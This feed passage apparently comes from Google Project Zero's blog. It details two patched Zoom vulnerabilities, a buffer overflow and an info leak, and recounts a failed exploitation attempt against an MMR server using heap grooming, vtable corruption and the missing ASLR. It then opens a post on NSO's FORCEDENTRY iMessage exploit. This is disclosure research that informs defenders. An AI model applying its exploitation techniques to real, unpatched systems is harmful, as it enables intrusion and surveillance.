class="c1"&gt;&lt;span&gt;I tested this bug by hooking &lt;/span&gt;&lt;span class="c6"&gt;SSL_write&lt;/span&gt;&lt;span&gt;&amp;nbsp;with Frida, and sending the malformed packet, and it caused the Zoom client to crash on a variety of platforms. This vulnerability was assigned &lt;/span&gt;&lt;span class="c17 c20"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2223"&gt;CVE-2021-34423&lt;/a&gt;&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;and fixed on November 24, 2021.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;Looking at the code for the MMR server, I noticed that &lt;/span&gt;&lt;span class="c6"&gt;ssb::conf_send_msg_req::load_from&lt;/span&gt;&lt;span class="c2"&gt;, the class the vulnerability occurs in was also present on the MMR server. Since the MMR forwards Zoom meeting traffic from one client to another, it makes sense that it might also deserialize this packet type. I analyzed the MMR code in IDA, and found that deserialization of this class only occurs during Zoom Webinars. I purchased a Zoom Webinar license, and was able to crash my own Zoom MMR server by sending this packet. I was not willing to test a vulnerability of this type on Zoom&amp;rsquo;s public MMR servers, but it seems reasonably likely that the same code was also in Zoom&amp;rsquo;s public servers.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Looking further at deserialization, I noticed that all deserialized objects contain an optional field of type &lt;/span&gt;&lt;span class="c6"&gt;ssb::dyna_para_table_t&lt;/span&gt;&lt;span&gt;, which is basically a properties table that allows a map of name strings to variant objects to be included in the deserialized object. The variants in the table are implemented by the structure &lt;/span&gt;&lt;span class="c6"&gt;ssb::variant_t&lt;/span&gt;&lt;span class="c2"&gt;, as follows.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;struct variant{&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;char type;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;short length;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;var_data data;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;union var_data{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;char i8;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;char* i8_ptr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;short i16;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;short* i16_ptr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;int i32;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;int* i32_ptr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;long long i64;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;long long i64*;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The value of the type field corresponds to the width of the variant data (1 for 8-bit, 2 for 16-bit, 3 for 32-bit and 4 four 64-bit). The length field specifies whether the variant is an array and its length. If it has the value 0, the variant is not an array, and a numeric value is read from the data field based on its type. If the length field has any other value, the data field is cast to a pointer, an array of that size is read.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;My immediate concern with this implementation was that it could be prone to type confusion. One possibility is that a numeric value could be confused with an array pointer, which would allow an attacker to create a variant with a pointer that they specify. However, both the client and MMR perform very aggressive type checks on variants they treat as arrays. Another possibility is that a pointer could be confused with a numeric value. This could allow an attacker to determine the address of a buffer they control if the value is ever returned to the attacker. I found a few locations in the MMR code where a pointer is converted to a numeric value in this way and logged, but nowhere that an attacker could obtain the incorrectly cast value. Finally, I looked at how array data is handled, and I found that there are several locations where byte array variants are converted to strings, however not all of them checked that the byte array has a null terminator. This meant that if these variants were converted to strings, the string could contain the contents of uninitialized memory.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Most of the time, packets sent to the MMR by one user are immediately forwarded to other users without being deserialized by the server. For some bugs, this is a useful feature, for example, it is what allows CVE-2021-34423 discussed earlier to be triggered on a client. However, an information leak in variants needs to occur on the server to be useful to an attacker. When a client deserializes an incoming packet, it is for use on the device, so even if a deserialized string contains sensitive information, it is unlikely that this information will be transmitted off the device. Meanwhile, the MMR exists expressly to transmit information from one user to another, so if a string gets deserialized, there is a reasonable chance that it gets sent to another user, or alters server behavior in an observable way. So, I tried to find a way to get the server to deserialize a variant and convert it to a string. I eventually figured out that when a user logs into Zoom in a browser, the browser can&amp;rsquo;t process serialized packets, so the MMR must convert them to strings so they can be accessed through web requests. Indeed, I found that if I removed the null terminator from the &lt;/span&gt;&lt;span class="c6"&gt;user_name&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;variant, it would be converted to a string and sent to the browser as the user&amp;rsquo;s display name.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The vulnerability was assigned &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2235&amp;q=zoom%5C&amp;can=1"&gt;CVE-2021-34424&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;and fixed on November 24, 2021. I tested it on my own MMR as well as Zoom&amp;rsquo;s public MMR, and it worked and returned pointer data in both cases.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.mbswjzdihcwb"&gt;&lt;span&gt;Exploit Attempt&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;I attempted to exploit my local MMR server with these vulnerabilities, and while I had success with portions of the exploit, &lt;/span&gt;&lt;span&gt;I was not able to get it working&lt;/span&gt;&lt;span class="c2"&gt;. I started off by investigating the possibility of creating a client that could trigger each bug outside of the Zoom client, but client authentication appeared complex and I lacked symbols for this part of the code, so I didn&amp;rsquo;t pursue this as I suspected it would be very time-consuming. Instead, I analyzed the exploitability of the bugs by triggering them from a Linux Zoom client hooked with Frida.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;I started off by investigating the impact of heap corruption on the MMR process. MMR servers run on CentOS 7, which uses a modern glibc heap, so exploiting heap unlinking did not seem promising. I &lt;/span&gt;&lt;span&gt;looked into overwriting the vtable of a C++ object allocated on the heap instead.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;I wrote several Frida scripts that hooked malloc on the server, and used them to monitor how incoming traffic affects allocation. It turned out that there are not many ways for an attacker to control memory allocation on an MMR server that are useful for exploiting this vulnerability. &lt;/span&gt;&lt;span&gt;There are several packet types that an attacker can send to the server that cause memory to be allocated on the heap and then freed when processing is finished, but not as many where the attacker can trigger both allocation and freeing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Moreover, the MMR server performs different types of processing in separate threads that use unique heap arenas, so many areas of the code where this type of allocation is likely to occur, such as connection management, allocate memory in a different heap arena than the thread where the bug occurs. The only such allocations I could find that were made in the same arena were related to meeting set-up: when a user joins a meeting, certain objects are allocated on the heap, which are then freed when they leave the meeting. &lt;/span&gt;&lt;span&gt;Unfortunately, these allocations are difficult to automate as they require many unique users accounts in order for the allocation to be performed repeatedly, and allocation takes an observable amount of time (seconds).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;I eventually wrote Frida scripts that looked for free chunks of unusual sizes that bordered C++ objects with vtables during normal MMR operation. There were a few allocation sizes that met this criteria, and since CVE-2021-34423 allows for the size of the buffer that is overflowed to be specified by the attacker, I was able to corrupt the memory of the adjacent object. Unfortunately, heap verification was very robust, so in most cases, the MMR process would crash due to a heap verification error before a virtual call was made on the corrupted object. I eventually got around this by focusing on allocation sizes that are small enough to be stored in fastbins by the heap, as heap chunks that are stored in fastbins do not contain verifiable heap metadata. Chunks of size 58 turned out to be the best choice, and by triggering the bug with an allocation of that size, I was able to control the pointer of a virtual call about one in ten times I triggered the bug.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The next step was to figure out where to point the pointer I could control, and this turned out to be more challenging than I expected. The MMR process did not have ASLR enabled when I did this research (it was enabled in version 4.6.20211128.136, which was released on November 28, 2021), so I was hoping to find a series of locations in the binary that this call could be directed to that would eventually end in a call to &lt;/span&gt;&lt;span class="c6"&gt;execv&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;with controllable parameters, as the MMR initialization code contains many calls to this function. However, there were a few features of the server that made this difficult. First, only the MMR binary was loaded at a fixed location. The heap and system libraries were not, so only the actual MMR code was available without bypassing ASLR. Second, if the MMR crashes, it has an exponential backoff which culminates in it respawning every hour on the hour. This limits how many exploit attempts an attacker has. It is realistic that an attacker might spend days or even weeks trying to exploit a server, but this still limits them to hundreds of attempts. This means that any exploit of an MMR server would need to be at least somewhat reliable, so certain techniques that require a lot of attempts, such as allocating a large buffer on the heap and trying to guess its location were not practical.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;I eventually decided that it would be helpful to allocate a buffer on the heap with controlled contents and determine its location. This would make the exploit fairly reliable in the case that the &lt;/span&gt;&lt;span&gt;overfl&lt;/span&gt;&lt;span&gt;ow successfully leads to a virtual call, as the buffer could be used as a fake vtable, and also contain strings that could be used as parameters to &lt;/span&gt;&lt;span class="c6"&gt;execv&lt;/span&gt;&lt;span class="c2"&gt;. I tried using CVE-2021-34424 to leak such an address, but wasn&amp;rsquo;t able to get this working. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;This bug allows the attacker to provide a string of any size, which then gets copied out of bounds up until a null character is encountered in memory, and then returned. It is possible for CVE-2021-34424 to return a heap pointer, as the MMR maps the heap that gets corrupted at a low address that does not usually contain null bytes, however, I could not find a way to force a specific heap pointer to be allocated next to the string buffer that gets copied out of bounds. C++ objects used by the MMR tend to be virtual objects, so the first 64 bits of most object allocations are a vtable which contains null bytes, ending the copy. Other allocated structures, especially larger ones, tend to contain non-pointer data. I was able to get this bug to return heap pointers by specifying a string that was less than 64 bits long, so the nearby allocations were sometimes the pointers themselves, but allocations of this size are so frequent it was not possible to ascertain what heap data they pointed to with any accuracy.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;One last idea I had was to use another type confusion bug to leak a pointer to a controllable buffer. There is one such &lt;/span&gt;&lt;span&gt;bug&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the processing of deserialized &lt;/span&gt;&lt;span class="c6"&gt;ssb::kv_update_req&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects. This object&amp;rsquo;s &lt;/span&gt;&lt;span class="c6"&gt;ssb::dyna_para_table_t &lt;/span&gt;&lt;span&gt;table contains a variant named &lt;/span&gt;&lt;span class="c6"&gt;nodeid&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;which represents the specific Zoom client that the message refers to. If an attacker changes this variant to be of type array instead of a 32-bit integer, the address of the pointer to this array will be logged as a string. I tried to combine CVE-2021-34424 with this bug, hoping that it might be possible for the leaked data to be this log string that contains pointer information. Unfortunately, I wasn&amp;rsquo;t able to get this to work because of timing: the log entry needs to be logged at almost exactly the same time as the bug is triggered so that the log data is still in memory, and I wasn&amp;#39;t able to send packets fast enough. I suspect it might be possible for this to work with improved automation, as I was relying on clients hooked with Frida and browsers to interact with the Zoom server, but I decided not to pursue this as it would require tooling that would take substantial effort to develop.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.oicfsqzplw6"&gt;&lt;span class="c10"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;I performed a security analysis of Zoom and reported two vulnerabilities. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The vulnerabilities in Zoom&amp;rsquo;s MMR server are especially concerning, as this server processes meeting audio and video content, so a compromise could allow an attacker to monitor any Zoom meetings that do not have end-to-end encryption enabled. While I was not successful in exploiting these vulnerabilities, I was able to use them to perform many elements of exploitation, and I believe that an attacker would be able to exploit them with sufficient investment. The lack of ASLR in the Zoom MMR process greatly increased the risk that an attacker could compromise it, and it is positive that Zoom has recently enabled it. That said, if vulnerabilities similar to the ones that I reported still exist in the MMR server, it is likely that an attacker could bypass it, so it is also important that Zoom continue to improve the robustness of the MMR code. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;It is also important to note that this research was possible because Zoom allows customers to set up their own servers, meanwhile no other video conferencing solution with proprietary servers that I have investigated allows this, so it is unclear how these results compare to other video conferencing platforms.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Overall, while the client bugs that were discovered during this research were comparable to what Project Zero has found in other videoconferencing platforms, the server bugs were surprising, especially when the server lacked ASLR and supports modes of operation that are not end-to-end encrypted. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;There are a few factors that commonly lead to security problems in videoconferencing applications that contributed to these bugs in Zoom. One is the huge amount of code included in Zoom. There were large portions of code that I couldn&amp;rsquo;t determine the functionality of, and many of the classes that could be deserialized didn&amp;rsquo;t appear to be commonly used. This both increases the difficulty of security research and increases the attack surface by making more code that could potentially contain vulnerabilities available to attackers. In addition, Zoom uses many proprietary formats and protocols which meant that understanding the attack surface of the platform and creating the tooling to manipulate specific interfaces was very time consuming. Using the features we tested also required paying roughly $1500 USD in licensing fees. These barriers to security research likely mean that Zoom is not investigated as often as it could be, potentially leading to simple bugs going undiscovered. &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Still, my largest concern in this assessment was the lack of ASLR in the Zoom MMR server. ASLR is arguably the most important mitigation in preventing exploitation of memory corruption, and most other mitigations rely on it on some level to be effective. There is no good reason for it to be disabled in the vast majority of software. There has recently been a push to reduce the susceptibility of software to memory corruption vulnerabilities by moving to memory-safe languages and implementing enhanced memory mitigations, but this relies on vendors using the security measures provided by the platforms they write software for. All software written for platforms that support ASLR should have it (and other basic memory mitigations) enabled.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The closed nature of Zoom also impacted this analysis greatly. Most video conferencing systems use open-source software, either WebRTC or PJSIP. While these platforms are not free of problems, it&amp;rsquo;s easier for researchers, customers and vendors alike to verify their security properties and understand the risk they present because they are open. Closed-source software presents unique security challenges, and Zoom could do more to make their platform accessible to security researchers and others who wish to evaluate it. While the Zoom Security Team helped me access and configure server software, it is not clear that support is available to other researchers, and licensing the software was still expensive. &lt;/span&gt;&lt;span&gt;Zoom, and other companies that produce closed-source security-sensitive software should consider how to make their software accessible to security researchers. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1246610633949568195/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html" title="Zooming in on Zero-click Exploits" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-5073082417618502919</id>
    <published>2021-12-15T09:00:00.000-08:00</published>
    <updated>2021-12-15T09:00:02.766-08:00</updated>
    <title type="text">A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#b7b7b7;border-top-width:1pt;border-right-width:1pt;border-left-color:#b7b7b7;vertical-align:top;border-right-color:#b7b7b7;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#b7b7b7;border-bottom-style:solid}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c20{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right;height:11pt}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c14{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.c23{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c22{border-spacing:0;border-collapse:collapse;margin-right:auto}.c21{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c17{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c2{color:inherit;text-decoration:inherit}.c15{font-weight:400;font-family:Consolas,"Courier New"}.c6{font-weight:400;font-family:"Courier New"}.c8{font-weight:700}.c11{height:0pt}.c7{font-style:italic}.c10{height:11pt}.c18{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c17"&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;Posted by Ian Beer &amp;amp; Samuel Gro&amp;szlig; of Google Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&amp;rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. The editorial opinions reflected below are solely Project Zero&amp;rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Earlier this year, Citizen Lab managed to capture an NSO iMessage-based zero-click exploit being used to target a Saudi activist.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this two-part blog post series we will describe &lt;/span&gt;&lt;span&gt;for the first time&lt;/span&gt;&lt;span&gt;&amp;nbsp;how an in-the-wild zero-click iMessage exploit works.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Based on our research and findings, we &lt;/span&gt;&lt;span&gt;assess&lt;/span&gt;&lt;span&gt;&amp;nbsp;this to be &lt;/span&gt;&lt;span&gt;one of the most technically sophisticated exploits we&amp;#39;ve ever seen, further&lt;/span&gt;&lt;span&gt;&amp;nbsp;demonstrating &lt;/span&gt;&lt;span&gt;that the capabilities NSO provides rival those previously thought to be accessible to only a handful of nation states.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The vulnerability discussed in this blog post was fixed on September 13, 2021 in &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://support.apple.com/en-us/HT212807"&gt;iOS 14.8&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as CVE-2021-30860.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;NSO&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://en.wikipedia.org/wiki/NSO_Group"&gt;NSO&lt;/a&gt;&lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://en.wikipedia.org/wiki/NSO_Group"&gt;&amp;nbsp;Group&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt;&amp;nbsp;one of the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.atlanticcouncil.org/in-depth-research-reports/report/countering-cyber-proliferation-zeroing-in-on-access-as-a-service/"&gt;highest-profile providers of &amp;quot;access-as-a-service&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, selling packaged hacking solutions which &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.atlanticcouncil.org/in-depth-research-reports/issue-brief/surveillance-technology-at-the-fair/"&gt;enable nation state actors without a home-grown offensive cyber capability to &amp;quot;pay-to-play&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;, vastly expanding the number of nations with such cyber capabilities.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;For years, groups like Citizen Lab and Amnesty International have been tracking the use of NSO&amp;#39;s mobile spyware package &amp;quot;Pegasus&amp;quot;. Despite NSO&amp;#39;s claims that they &amp;quot;&lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.nsogroup.com/governance/human-rights-policy/"&gt;[evaluate] the potential for adverse human rights impacts arising from the misuse of NSO products&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;quot; Pegasus has been linked to &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://citizenlab.ca/2020/01/stopping-the-press-new-york-times-journalist-targeted-by-saudi-linked-pegasus-spyware-operator/"&gt;the hacking of the New York Times journalist Ben Hubbard by the Saudi regime&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.amnesty.org/en/latest/research/2019/10/morocco-human-rights-defenders-targeted-with-nso-groups-spyware/"&gt;hacking of human rights defenders in Morocco&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://citizenlab.ca/2021/08/bahrain-hacks-activists-with-nso-group-zero-click-iphone-exploits/"&gt;Bahrain&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.amnesty.org/en/latest/research/2018/08/amnesty-international-among-targets-of-nso-powered-campaign/"&gt;the targeting of Amnesty International staff&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;and dozens of other cases.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p 